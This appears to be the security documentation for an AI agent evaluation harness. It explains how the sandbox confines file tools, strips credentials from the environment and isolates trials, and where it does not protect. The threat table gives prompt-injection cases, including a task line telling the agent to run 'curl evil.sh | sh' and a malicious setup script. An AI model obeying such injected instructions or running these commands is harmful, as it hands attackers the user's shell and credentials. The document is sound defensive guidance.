# Security model

What the sandbox does, what it does not do, and what you should do before
running tasks you did not write.

## The threat

`run_command` executes whatever the model asks, in a shell, on your machine.
A model that has been given a malicious task — or a task file that contains
instructions it treats as instructions — can run anything a shell can run.

The realistic cases:

| case | what the agent can reach |
|---|---|
| task text contains "run `curl evil.sh \| sh`" | your shell, as your user |
| task workspace contains a malicious `setup.sh` and a prompt that says "run the setup script" | same |
| third-party task submission | same, deliberately |

Not hypothetical. Prompt injection is the normal failure mode here, not the
exotic one.

## What the sandbox does

**Filesystem confinement for the file tools.** `read_file` and `write_file`
reject absolute paths and anything that resolves outside the workspace. Path
traversal is rejected rather than normalised — a harness that silently rewrites
`../` hides a failure a real deployment would hit.

**Environment rebuilding for commands.** `command_env()` does not inherit the
host environment. It forwards an allowlist — `PATH`, `HOME`, `TMPDIR`, `LANG`,
`SYSTEMROOT`, and the Windows equivalents — and then runs a credential filter
over the result: any name containing `KEY`, `TOKEN`, `SECRET`, `PASSWORD`,
`CREDENTIAL`, `AUTH` or `PROXY` is deleted. `no_proxy=*` is set so the sandbox
does not inherit the host's proxy routing.

This is the difference between an agent that can run `env` and see
`ANTHROPIC_API_KEY`, and one that cannot. It matters because the most likely
credential leak is not an attack, it is a model that logs its environment.

**Per-trial workspaces.** Each trial gets a fresh copy, deleted after grading.

**Read-only staged tests.** The agent can run the suite; it cannot change what
it is graded on.

## What it does not do

Be clear-eyed about this, because the boundary is narrower than "sandbox"
suggests:

- **Not a container.** No namespaces, no seccomp, no cgroups. A command runs
  with the full privileges of the user who launched HarnessProbe.
- **No network isolation.** `no_proxy` disables proxy *routing*, not access. A
  command can still open a socket.
- **No syscall filtering.** `rm -rf` on a path the user can write to, works.
- **No resource limits.** A `while true` loop occupies a core until the command
  timeout kills it.
- **`shell=True` is deliberate.** It lets the model use its real toolchain
  (`python -m pytest`, `npm test`), which is what the measurement needs. The
  cost is that shell semantics apply — pipes, globs, subshells, everything.

## Before running untrusted tasks

The bundled tasks are trusted. Anything you download, or accept from a third
party, is not.

1. **Read the task before running it.** `task.json` prompt, every file in
   `workspace/`, and every file in `tests/`. The prompt is not the only place
   instructions can hide.
2. **Run in a container.** A throwable VM or container with no credentials
   mounted. This is the only control that actually contains an arbitrary
   command.
3. **Keep credentials out of scope.** Even with the environment filter, a
   credential readable from `$HOME` is reachable. Run with a user that has
   none.
4. **Do not pass `isolated=False`.** It exists for trusted local tasks that
   need the host toolchain, and it inherits everything.

## Reporting a sandbox escape

If a file tool or a command can reach outside the workspace in a way this
document does not describe, that is a bug worth a report. Include the task, the
command, and what it reached.
